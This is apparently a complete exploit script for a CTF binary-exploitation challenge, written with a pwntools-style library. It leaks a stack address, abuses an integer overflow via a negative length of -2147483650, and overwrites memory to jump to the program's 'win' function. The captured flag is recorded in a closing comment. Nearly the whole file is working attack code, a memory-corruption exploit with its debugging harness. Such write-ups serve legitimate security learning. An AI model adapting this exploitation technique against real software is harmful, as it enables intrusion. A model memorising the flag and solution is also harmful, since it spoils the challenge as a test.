#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x401716
b *0x401708
b *0x4016CA
b *0x4016E2
b *0x4016FA
b *0x401458
b *0x401498
b *0x401748
c

'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# ==================== EXPLOIT ====================
p = start()

sla(b't\n', b'3')
sla(b':\n', b'A'*1022)

sla(b't\n', b'4')
sla(b': ', b'1016')
sla(b': ', b'8')
sl(b'B'*7)

sla(b't\n', b'2')
ru(b'B'*7 + b'\n')
stack_leak = fixleak(rl()[:-1])
slog('stack leak @ %#x', stack_leak)

debug()

sla(b't\n', b'4')
sla(b': ', b'1016')
sla(b': ', b'-2147483650')
sl(b'C'*0x8 + p64(stack_leak) + p64(0x400) + p64(0x400) + p64(0xdeadbeef)*2 + p64(exe.sym.win))

sla(b't\n', b'6')

interactive()
# GPNCTF{noW_YoU_5uRe1Y_AR3_rEadY_To_PwN_L4Dy8ird!}
